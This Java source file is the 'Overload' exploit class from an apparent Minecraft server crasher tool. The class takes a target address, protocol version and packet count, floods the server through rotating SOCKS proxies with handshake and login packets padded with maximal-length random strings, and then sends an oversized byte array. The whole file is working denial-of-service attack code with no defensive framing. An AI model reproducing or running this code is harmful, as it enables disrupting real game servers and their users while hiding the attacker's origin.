package uwu.narumi.crasher.core.exploit;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.LinkedList;
import java.util.Objects;
import java.util.Queue;
import uwu.narumi.crasher.api.exception.ExploitException;
import uwu.narumi.crasher.api.exploit.Exploit;
import uwu.narumi.crasher.api.exploit.ExploitInfo;
import uwu.narumi.crasher.api.exploit.argument.Argument;
import uwu.narumi.crasher.api.helper.AddressHelper.McAddress;
import uwu.narumi.crasher.api.helper.PacketHelper;
import uwu.narumi.crasher.api.helper.Protocol;
import uwu.narumi.crasher.api.helper.ProxyHelper;
import uwu.narumi.crasher.api.helper.StringHelper;
import uwu.narumi.crasher.api.io.NetOut;
import uwu.narumi.crasher.api.optimizer.Optimizer;
import uwu.narumi.crasher.api.packet.Packet;

@ExploitInfo(
    name = "Overload",
    description = "Overload xd?"
)
public class Overload extends Exploit<byte[]> {

  private final Queue<Packet[]> packets = new LinkedList<>();

  public Overload() {
    super(() -> new byte[Short.MAX_VALUE],
        new Argument("address", 0, McAddress.class),
        new Argument("version", 1, String.class),
        new Argument("amount", 2, Integer.class)
    );
  }

  @Override
  public void execute(Object... args) throws ExploitException {
    index.set(0);

    McAddress address = (McAddress) args[0];
    int protocol = Protocol.getByName((String) args[1]).getId();
    int amount = (int) args[2];

    preGenerate(amount, protocol);

    Optimizer.startOptimizing(Overload.class);
    Optimizer.setStopAction(packets::clear);
    Optimizer.post(() -> {
      try {
        Proxy proxy = ProxyHelper.getSocks();
        Socket socket = ProxyHelper.createSocket(proxy);
        if (socket == null) {
          throw new ThreadDeath();
        }

        socket.connect(new InetSocketAddress(address.getIp(), address.getPort()));
        NetOut netOut = new NetOut(socket.getOutputStream());
        for (Packet packet : Objects.requireNonNull(packets.poll())) {
          packet.send(netOut);
        }
        netOut.writeByteArray(exploitSource().get());

        Optimizer.update();
        System.out.println(String
            .format("%s -> %s | %s/%s", proxy, address, index.getAndIncrement(),
                amount));
      } catch (Exception ignored) {
      }
    }, amount);
  }

  private void preGenerate(int amount, int protocol) {
    System.out.println("Pre generating packets");
    for (int i = 0; i < amount; i++) {
      packets.add(new Packet[]{
          PacketHelper.createHandshake(protocol, StringHelper.getRandomString(Short.MAX_VALUE),
              Short.MIN_VALUE, 2),
          PacketHelper.createLoginStart(StringHelper.getRandomString(Short.MAX_VALUE))
      });
    }
    System.out.println("Generated packets");
  }
}
